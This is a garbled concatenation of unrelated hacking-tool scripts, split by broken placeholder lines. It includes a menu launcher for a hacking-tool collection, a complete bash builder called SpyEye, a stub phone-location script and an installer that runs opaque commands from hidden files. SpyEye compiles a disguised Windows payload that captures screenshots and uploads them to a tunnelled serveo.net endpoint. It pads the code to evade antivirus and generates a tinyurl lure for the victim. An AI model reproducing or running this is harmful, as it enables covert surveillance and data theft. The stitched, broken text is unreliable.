import python,,,

tool1="command for tool 1";`

# Version 1.1.0
import os
import sys
import webbrowser
from platform import system
from time import sleep

from core import HackingToolsCollection
from tools.anonsurf import AnonSurfTools
from tools.ddos import DDOSTools
from tools.exploit_frameworks import ExploitFrameworkTools
from tools.forensic_tools import ForensicTools
from tools.information_gathering_tools import InformationGatheringTools
from tools.other_tools import OtherTools
from tools.payload_creator import PayloadCreatorTools
from tools.phising_attack import PhishingAttackTools
from tools.post_exploitation import PostExploitationTools
from tools.remote_administration import RemoteAdministrationTools
from tools.reverse_engineering import ReverseEngineeringTools
from tools.sql_tools import SqlInjectionTools
from tools.steganography import SteganographyTools
from tools.tool_manager import ToolManager
from tools.webattack import WebAttackTools
from tools.wireless_attack_tools import WirelessAttackTools
from tools.wordlist_generator import WordlistGeneratorTools
from tools.xss_attack import XSSAttackTools

all_tools = [
    AnonSurfTools(),
    InformationGatheringTools(),
    WordlistGeneratorTools(),
    WirelessAttackTools(),
    SqlInjectionTools(),
    PhishingAttackTools(),
    WebAttackTools(),
    PostExploitationTools(),
    ForensicTools(),
    PayloadCreatorTools(),
    ExploitFrameworkTools(),
    ReverseEngineeringTools(),
    DDOSTools(),
    RemoteAdministrationTools(),
    XSSAttackTools(),
    SteganographyTools(),
    OtherTools(),
    ToolManager()
]


class AllTools(HackingToolsCollection):
    TITLE = "All tools"
    TOOLS = all_tools

    def show_info(self):
        print(logo + '\033[0m \033[97m')


if __name__ == "__main__":
    try:
        if system() == 'Linux':
            fpath = os.path.expanduser("~/hackingtoolpath.txt")
            if not os.path.exists(fpath):
                os.system('clear')
                # run.menu()
                print("""
                        [@] Set Path (All your tools will be installed in that directory)
                        [1] Manual 
                        [2] Default
                """)
                choice = input("Z4nzu =>> ").strip()

                if choice == "1":
                    inpath = input("Enter Path (with Directory Name) >> ").strip()
                    with open(fpath, "w") as f:
                        f.write(inpath)
                    print("Successfully Set Path to: {}".format(inpath))
                elif choice == "2":
                    autopath = "/home/hackingtool/"
                    with open(fpath, "w") as f:
                        f.write(autopath)
                    print("Your Default Path Is: {}".format(autopath))
                    sleep(3)
                else:
                    print("Try Again..!!")
                    sys.exit(0)

            with open(fpath) as f:
                archive = f.readline()
                os.makedirs(archive, exist_ok=True)
                os.chdir(archive)
                AllTools().show_options()

        # If not Linux and probably Windows
        elif system() == "Windows":
            print(
                r"\033[91m Please Run This Tool On A Debian System For Best Results\e[00m"
            )
            sleep(2)
            webbrowser.open_new_tab("https://tinyurl.com/y522modc")

        else:
            print("Please Check Your System or Open New Issue ...")

    except KeyboardInterrupt:
        print("\nExiting ..!!!")
        sleep(2)
        
tool1="command for tool 2";`

#!/bin/bash
# SpyEye v1.0
# Coded by @linux_choice (Don't change! Read the License!)
# Github: https://github.com/thelinuxchoice/spyeye

host="http://serveo.net" #"159.89.214.31" #Serveo.net (Port Forwarding Tunneling)

trap 'printf "\n";stop' 2

banner() {

printf "     \e[1;93m ___                  \e[0m\e[1;77m___                  \e[0m\n"
printf "     \e[1;93m(  _\`\               \e[0m\e[1;77m(  _\`\                \e[0m\n"
printf "     \e[1;93m| (_(_) _ _    _   _ \e[0m\e[1;77m| (_(_) _   _    __   \e[0m\n"
printf "     \e[1;93m\`\__ \ ( '_\`\ ( ) ( )\e[0m\e[1;77m|  _)_ ( ) ( ) /'__\`\ \e[0m\n"
printf "     \e[1;93m( )_) || (_) )| (_) |\e[0m\e[1;77m| (_( )| (_) |(  ___/ \e[0m\n"
printf "     \e[1;93m\`\____)| ,__/'\`\__, |\e[0m\e[1;77m(____/'\`\__, |\`\____) \e[0m\n"
printf "     \e[1;93m       | |    ( )_| |\e[0m\e[1;77m       ( )_| |        \e[0m\n"
printf "     \e[1;93m       (_)    \`\___/'\e[0m\e[1;77m       \`\___/'        \e[0m\n"
                                                                                             
printf "\n"
printf "\e[1;77m          .:.:\e[0m\e[1;77m ScreenShot Hijack v1.0 \e[0m\e[1;77m:.:.\e[0m\n"                              
printf "\e[1;93m         .:.:\e[0m\e[1;92m Coded by: \e[0m\e[1;77m @linux_choice\e[0m \e[1;93m:.:.\e[0m\n"
printf "\n"
printf "     \e[101m::  Warning: Attacking targets without  ::\e[0m\n"
printf "     \e[101m::  prior mutual consent is illegal!    ::\e[0m\n"
printf "\n"

}


stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: \"bash install.sh\" .Aborting."; 
exit 1; }


}



wait_file() {

while [ true ]; do
if [[ -e Log.log ]]; then
printf "\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Screenshot Received! [Saved in: uploadedfiles/ ]\e[0m\n"
cat Log.log >> log.backup
rm -rf Log.log

fi
sleep 0.5
done


}

server() {

if [[ ! -d uploadedfiles ]]; then
mkdir uploadedfiles/
fi
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"


$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net -R '$default_port3':localhost:'$default_port2'  2> /dev/null > sendlink ' &
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m]\e[0m\e[1;92m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $default_port3
sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/%s.exe \n' $send_link $payload_name
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.exe | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting php server1... (localhost:%s)\e[0m\n" $port
php -S localhost:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting php server2... (localhost:%s)\e[0m\n" $default_port2
php -S localhost:$default_port2  > /dev/null 2>&1 &
sleep 3
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Screenshot files...\e[0m\n'
wait_file
printf "\n"



}

compile() {

if [[ ! -e program.c ]]; then
printf "\e[1;93m[!] Error...\e[0m\n"
exit 1
else
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Compiling... \e[0m\n"
#i686-w64-mingw32-windres icon.rc -O coff -o my.res
i686-w64-mingw32-gcc program.c -o $payload_name.exe -DCURL_STATICLIB -static -lstdc++ -lgcc -lpthread -lcurl -lwldap32 -lws2_32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include -pthread
#i686-w64-mingw32-gcc program.c my.res -o $payload_name.exe -DCURL_STATICLIB -static -lstdc++ -lgcc -lpthread -lcurl -lwldap32 -lws2_32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include -pthread
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s.exe\n" $payload_name
printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, don't upload to virustotal.com !\e[0m\n"
rm -rf program.c
rm -rf icon.rc
#rm -rf my.res
fi

}

icon() {

default_payload_icon="icon/messenger.ico"
printf '\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put ICON path (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_icon
read payload_icon
payload_icon="${payload_icon:-${default_payload_icon}}"

if [[ ! -e $payload_icon ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] File not Found! Try Again! \e[0m\n'
icon
else
if [[ $payload_icon != *.ico ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, use *.ico file format. Try Again! \e[0m\n'
icon
fi
fi

}

start() {
rm -rf Log.log
default_port=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Random:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
default_payload_name="payload"
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"
#icon
payload
compile
server



}

#generatePadding function from powerfull.sh file (by https://github.com/Screetsec/TheFatRat/blob/master/powerfull.sh)
function generatePadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)

    counter=0
    randomNumber=$((RANDOM%${randomness}+23))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> program.c
	randomCharnameSize=$((RANDOM%10+7))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]=" >> program.c
    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+7))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then
			echo "$randomString;" >> program.c
		else
			echo $randomString >> program.c
		fi
	done
        let counter=counter+1
    done
}

payload() {


printf "#include <stdio.h>\n" > program.c
printf "#include <winsock2.h>\n" >> program.c
printf "#include <windows.h>\n" >> program.c
printf "#include <string.h>\n" >> program.c
printf "#include <curl/curl.h>\n" >> program.c
generatePadding
generatePadding
cat part1 >> program.c

printf 'strcpy( command, \"cmd.exe /c echo $outputFile = \\"screenshot.bmp\\" > ps.ps1 & echo Add-Type -AssemblyName System.Windows.Forms >> ps.ps1 & echo Add-type -AssemblyName System.Drawing >> ps.ps1 & echo $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen >> ps.ps1 & echo $Width = $Screen.Width >> ps.ps1 & echo $Height = $Screen.Height >> ps.ps1 & echo $Left = $Screen.Left >> ps.ps1 & echo $Top = $Screen.Top >> ps.ps1 & echo $screenshotImage = New-Object System.Drawing.Bitmap $Width, $Height >> ps.ps1 & echo $graphicObject = [System.Drawing.Graphics]::FromImage($screenshotImage) >> ps.ps1 & echo $graphicObject.CopyFromScreen($Left, $Top, 0, 0, $screenshotImage.Size) >> ps.ps1 & echo $screenshotImage.Save($outputFile) >> ps.ps1 & echo sleep 10 >> ps.ps1 & echo $command = \\"cmd.exe /c taskkill /f /im %s.exe\\" >> ps.ps1 & echo iex \\"& $command\\" >> ps.ps1 & echo $scriptPath = split-path -parent $MyInvocation.MyCommand.Definition >> ps.ps1 & echo $command2 = \\"start -NoNewWindow $scriptPath\\\%s.exe\\" >> ps.ps1 & echo iex \\"& $command2\\" >> ps.ps1 & exit\");' $payload_name $payload_name >> program.c

cat part3 >> program.c
printf "    curl_easy_setopt(curl, CURLOPT_URL, \"%s:%s/receive.php\");\n" $host $default_port3 >> program.c
cat part2 >> program.c
generatePadding >> program.c
generatePadding >> program.c
printf "id ICON \"%s\"" $payload_icon  > icon.rc

}

banner
dependencies
start

tool3="command for tool 3";`

Copy code`#!/usr/bin/bash
#Enter any number to get their location
echo -n "Enter any number : "
read number`

tool4="command for tool 4";`

#!/usr/bin/python

"""
Author             : Ms.ambari
contact            : ambari.developer@gmail.com
Github             : https://github.com/Ranginang67
my youtube channel : Ms.ambari

subcribe my youtube Channel to learn ethical Hacking ^_^
"""

import sys
import os.path
import subprocess

ntfile = ['.module', 'lib']

ubuntu = '' + str(open('.module/jalurU.ms').read())
termux = '' + str(open('.module/jalurT.ms').read())
termlb = '' + str(open('.module/ngentot.ms').read())
instal = '' + str(open('.module/IN.ms').read())


def _main_():
    if os.path.isdir('' + ubuntu.strip()):
        if os.getuid() != 0:
            print '[x] Failed: your must be root'
            sys.exit()

        if not os.path.isdir(ntfile[0]):
            print '[x] Failed: no directory module'
            sys.exit()

        if not os.path.isdir(ntfile[1]):
            print '[x] Failed: no directory lib'
            sys.exit()
        else:

            print '' + instal.strip()

            # ==================================================================#

            os.system('python .module/files/' + str(open('.module/A.ms'
                      ).read()))
            os.system('python .module/files/' + str(open('.module/B.ms'
                      ).read()))
            os.system('python .module/files/' + str(open('.module/C.ms'
                      ).read()))
            os.system('python .module/files/' + str(open('.module/D.ms'
                      ).read()))
            os.system('python .module/files/' + str(open('.module/E.ms'
                      ).read()))
            os.system('python .module/files/' + str(open('.module/F.ms'
                      ).read()))
            os.system('python .module/files/' + str(open('.module/G.ms'
                      ).read()))
            os.system('python .module/files/' + str(open('.module/H.ms'
                      ).read()))

            # ==================================================================#

            if os.path.isdir('/usr/bin/lib'):
                os.system('rm -rf /usr/bin/lib')
                os.system('' + str(open('.module/pindahU.ms').read()))
                os.system('' + str(open('.module/PindahU.ms').read()))

            if not os.path.isdir('/usr/bin/lib'):
                os.system('' + str(open('.module/pindahU.ms').read()))
                os.system('' + str(open('.module/PindahU.ms').read()))

            # ==================================================================#

            print '' + str(open('.module/DU.la').read())
            print '' + str(open('.module/Du').read())
            os.system('python .JM.xn')

            # ==================================================================#

    if os.path.isdir('' + termux.strip()):
        if not os.path.isdir('' + termux.strip()):
            sys.exit()

        if not os.path.isdir(ntfile[0]):
            print '[x] Failed: no directory module'
            sys.exit()

        if not os.path.isdir(ntfile[1]):
            print '[x] Failed: no directory lib'
            sys.exit()
        else:

            print '' + instal.strip()

            # ==============================================================#

            os.system('python2 .module/' + str(open('.module/A.ms'
                      ).read()))
            os.system('python2 .module/' + str(open('.module/B.ms'
                      ).read()))
            os.system('python2 .module/' + str(open('.module/C.ms'
                      ).read()))
            os.system('python2 .module/' + str(open('.module/D.ms'
                      ).read()))
            os.system('python2 .module/' + str(open('.module/E.ms'
                      ).read()))
            os.system('python2 .module/' + str(open('.module/F.ms'
                      ).read()))
            os.system('python2 .module/' + str(open('.module/G.ms'
                      ).read()))
            os.system('python2 .module/' + str(open('.module/H.ms'
                      ).read()))

            # ==============================================================#

            if os.path.isdir('' + termlb.strip()):
                os.system('' + str(open('.module/pacar.ms').read()))
                os.system('' + str(open('.module/pindahT.ms').read()))
                os.system('' + str(open('.module/PINDAHT.txt').read()))

            if not os.path.isdir('' + termlb.strip()):
                os.system('' + str(open('.module/pindahT.ms').read()))
                os.system('' + str(open('.module/PINDAHT.txt').read()))

            # ==============================================================#

            print '' + str(open('.module/DU.la').read())
            print '' + str(open('.module/Du').read())
            os.system('python2 .JM.xn && cd')


            # ==============================================================#

if __name__ == '__main__':
    _main_()
tool5="command for tool 5";`